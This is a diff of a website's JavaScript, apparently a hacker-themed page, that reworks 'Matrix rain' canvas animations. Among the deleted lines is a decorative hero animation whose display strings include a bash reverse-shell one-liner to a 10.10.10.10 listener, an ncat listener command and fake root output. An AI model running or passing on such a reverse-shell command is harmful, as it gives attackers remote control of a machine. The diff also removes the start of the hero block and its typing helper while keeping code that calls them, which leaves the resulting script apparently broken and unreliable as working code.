@@ -71,65 +71,7 @@
   if(grid) io.observe(grid); else run();
 })();
 
-/* ===== Fondo Matrix (canvas) ===== */
-(function(){
-  const c = document.getElementById('matrix-bg');
-  if(!c) return;
-  const ctx = c.getContext('2d');
-  let w=0,h=0,cols=0,y=[];
-  const glyphs = '$#%&*+<>=-abcdefghijklmnopqrstuvwxyz0123456789'.split('');
-  const CELL = 14, ROW = 16;
-
-  function fit(){
-    const r = c.getBoundingClientRect();
-    const dpr = Math.max(1, window.devicePixelRatio || 1);
-    c.width  = Math.floor(r.width * dpr);
-    c.height = Math.floor(r.height * dpr);
-    w = c.width; h = c.height;
-    ctx.setTransform(dpr,0,0,dpr,0,0);
-    cols = Math.ceil(r.width / CELL);
-    y = new Array(cols).fill(0);
-  }
-  function tick(){
-    ctx.fillStyle = 'rgba(0,0,0,0.09)'; ctx.fillRect(0,0,w,h);
-    ctx.fillStyle = '#ff2a55';
-    ctx.font = '14px monospace';
-    for(let i=0;i<cols;i++){
-      const text = glyphs[(Math.random()*glyphs.length)|0];
-      ctx.fillText(text, i*CELL, y[i]*ROW);
-      if(y[i]*ROW > h && Math.random() > 0.975) y[i] = 0;
-      else y[i]++;
-    }
-    raf = requestAnimationFrame(tick);
-  }
-  let raf; fit(); tick();
-  addEventListener('resize', fit, {passive:true});
-  if (matchMedia('(prefers-reduced-motion: reduce)').matches){
-    cancelAnimationFrame(raf); ctx.clearRect(0,0,w,h);
-  }
-})();
-
-/* ===== Hero: reverse shell + id(root) ===== */
-(function(){
-  const A = document.querySelector('[data-ty="a"]');
-  const B = document.querySelector('[data-ty="b"]');
-  if(!A || !B) return;
-  const a = [
-    "ncat -lvnp 4444",
-    "listening on [any] 4444 ...",
-    "connection received from 10.10.10.42",
-    "id",
-    "uid=0(root) gid=0(root) groups=0(root)"
-  ];
-  const b = [ "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" ];
-
-  function type(el, s, d){
-    return new Promise(res=>{
-      let i=0;(function step(){
-        if(i<s.length){ el.textContent += s.charAt(i++); setTimeout(step,d); }
-        else{ el.textContent += "\n"; res(); }
-      })();
-    });
+});
   }
   async function run(){
     A.textContent=""; B.textContent="";
@@ -144,15 +86,12 @@
   else run();
 })();
 
-/* === Matrix rain for side gutters only (hero) === */
+/* MATRIX_GUTTERS_V1 */
 (function(){
   function Matrix(canvas){
-    this.c = canvas;
-    this.ctx = canvas.getContext('2d');
-    this.w = this.h = this.cols = 0;
-    this.drops = [];
-    this.speed = [];
+    this.c = canvas; this.ctx = canvas.getContext('2d');
     this.dpr = Math.max(1, window.devicePixelRatio || 1);
+    this.w=this.h=this.cols=0; this.drops=[]; this.speed=[];
   }
   Matrix.prototype.fit = function(){
     const r = this.c.getBoundingClientRect();
@@ -160,39 +99,33 @@
     this.c.height = Math.max(1, Math.floor(r.height * this.dpr));
     this.w = this.c.width / this.dpr; this.h = this.c.height / this.dpr;
     this.ctx.setTransform(this.dpr,0,0,this.dpr,0,0);
-    const CELL = 14;
-    this.cols = Math.max(1, Math.ceil(this.w / CELL));
+    const CELL=14; this.cols=Math.max(1, Math.ceil(this.w/CELL));
     this.drops = new Array(this.cols).fill(0);
     this.speed = new Array(this.cols).fill(0).map(()=> 8 + Math.random()*18);
     this.ctx.font = '14px monospace';
   };
   Matrix.prototype.tick = function(){
-    const ctx = this.ctx;
-    ctx.fillStyle = 'rgba(0,0,0,0.09)'; ctx.fillRect(0,0,this.w,this.h);
-    const glyphs = 'アカサタナハマヤラワ0123456789'.split('');
-    const HEAD = '#aaffcc', TAIL = '#0b3';
+    const ctx=this.ctx;
+    ctx.fillStyle='rgba(0,0,0,.09)'; ctx.fillRect(0,0,this.w,this.h);
+    const glyphs='アカサタナハマヤラワ0123456789'.split('');
+    const HEAD='#aaffcc', TAIL='#0b3';
     for(let i=0;i<this.cols;i++){
-      const x = i*14;
-      const y = this.drops[i]*16;
-      ctx.fillStyle = TAIL; ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y-16);
-      ctx.fillStyle = HEAD; ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y);
-      this.drops[i] += this.speed[i]/16;
-      if(y > this.h + 100 || Math.random() > 0.995){
-        this.drops[i] = -Math.random()*50;
-        this.speed[i] = 8 + Math.random()*18;
+      const x=i*14, y=this.drops[i]*16;
+      ctx.fillStyle=TAIL; ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y-16);
+      ctx.fillStyle=HEAD; ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y);
+      this.drops[i]+=this.speed[i]/16;
+      if(y>this.h+100 || Math.random()>0.995){
+        this.drops[i]=-Math.random()*50; this.speed[i]=8+Math.random()*18;
       }
     }
   };
-  const L = document.getElementById('matrix-left');
-  const R = document.getElementById('matrix-right');
-  if(!L || !R) return;
-  const A = new Matrix(L), B = new Matrix(R);
+  const L=document.getElementById('matrix-left');
+  const R=document.getElementById('matrix-right');
+  if(!L||!R) return;
+  const A=new Matrix(L), B=new Matrix(R);
   function fit(){ A.fit(); B.fit(); }
-  function loop(){ A.tick(); B.tick(); raf = requestAnimationFrame(loop); }
-  let raf; fit(); loop();
+  function loop(){ A.tick(); B.tick(); raf=requestAnimationFrame(loop); }
+  let raf; if (document.readyState==='loading'){ addEventListener('DOMContentLoaded', ()=>{ fit(); loop(); }); } else { fit(); loop(); }
   addEventListener('resize', fit, {passive:true});
-  if (matchMedia('(prefers-reduced-motion: reduce)').matches){
-    cancelAnimationFrame(raf);
-  }
+  if (matchMedia('(prefers-reduced-motion: reduce)').matches){ cancelAnimationFrame(raf); }
 })();
-
